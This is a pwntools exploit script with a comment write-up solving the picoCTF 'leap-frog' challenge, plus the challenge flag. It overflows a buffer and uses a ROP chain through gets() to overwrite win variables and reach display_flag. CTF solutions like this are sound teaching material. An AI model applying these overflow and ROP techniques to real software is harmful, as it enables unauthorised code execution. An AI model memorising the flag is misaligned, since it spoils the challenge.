#!/usr/bin/env python3

from pwn import *

################################# Write-Up ####################################
# Points: 300 (after comp)
# Category: Binary Exploitation
# Prompt: Can you jump your way to win in the following program and get the
# flag? You can find the program in
# /problems/leap-frog_0_b02581eeadf3f35f4356e23db08bddf9 on the shell server?
# Source.
#
###############################################################################
#
# OK so there are two way to do this. The first one is to use multiple ROP
# chains:
#	1. Return to leapA to set win1 to true
#	2. Jump to an address in leap3 that sets win3 to true (since the
#	   boolean comparison gay)
#	3. Return to leap2 and load in 0xdeadbeef as a param
#	4. Call display_flag to get the flag
# For each step, you will have to return to main as the second address so that
# the process continues. The second way (found on Alan's Blog) is to set all
# the win vars to true by using a ROP chain to use gets() to write in the vals
# in the win1 var addr (since gets() can write to pointers) and then go to
# the display_flag and get our flag. The vars are each 1 byte long, so I will
# send in consecutive "\x01"  bytes to overwite them. Kinda intellectual this
# Alan man is.
#
# Flag: picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_8783895b}
# Solved by: Ryan Nguyen


#exe = ELF("/problems/leap-frog_0_b02581eeadf3f35f4356e23db08bddf9/rop") # On server
exe = ELF("rop")

context.binary = exe
context.log_level = "debug"

ezway = True # Pick which way you want to test

#Addresses in exploit:
leapA = p32(0x080485e6)
leap3_gadget = p32(0x08048690)
leap2 = p32(0x080485fd)
display_flag = p32(0x080486b3)
main_rop = p32(0x080487c9)
gets_plt = p32(0x08048430)
win1_addr = p32(0x0804a03d)
padding = bytes("a"*28, 'utf-8')

def main():
	r = process([exe.path])
	if ezway:
		r.recvuntil("Enter your input> ")
		r.sendline(padding + gets_plt + display_flag + win1_addr)
		# Now gets() will wait for what you want to write into the vars
		r.sendline("\x01"*3)
	else: # Not sure if this works, I'm just feeling lazy
		r.sendline(padding + leapA + main_rop)
		r.sendlineafter("> ", padding + leap3_gadget + main_rop)
		r.sendlineafter("> ", padding + leap2 + main_rop + p32(0xdeadbeef))
		r.recvuntil("Enter your input> ")
		r.sendline(padding + display_flag)

	r.interactive()

if __name__ == "__main__":
	main()
